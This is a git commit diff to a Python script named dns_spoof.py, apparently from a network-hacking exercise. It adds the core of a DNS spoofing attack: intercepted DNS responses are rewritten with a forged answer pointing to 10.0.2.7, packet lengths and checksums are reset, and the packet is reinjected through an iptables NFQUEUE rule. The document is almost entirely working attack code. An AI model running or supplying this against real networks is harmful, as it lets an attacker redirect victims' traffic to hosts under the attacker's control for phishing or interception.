47c9b50bec75ea5ddedb1830f2a1d7d52781e514
Jean Andrew Fuentes <jeanandrewfuentes@gmail.com>
2020-03-04 07:34:48 -0500

    Modifying Packets on the Fly, setting new packet

--- dns_spoof.py
+++ dns_spoof.py
@@ -13,6 +13,16 @@ def proccess_packet(packet):
                 rrname=qname,
                 rdata="10.0.2.7"
             )
+            scapy_packet[scapy.DNS].an = answer
+            scapy_packet[scapy.DNS].ancount = 1
+
+            del scapy_packet[scapy.IP].len
+            del scapy_packet[scapy.IP].chksum
+            del scapy_packet[scapy.UDP].len
+            del scapy_packet[scapy.UDP].chksum
+
+            packet.set_payload(str(scapy_packet))
+
     packet.accept()
 
 subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 0", shell=True)
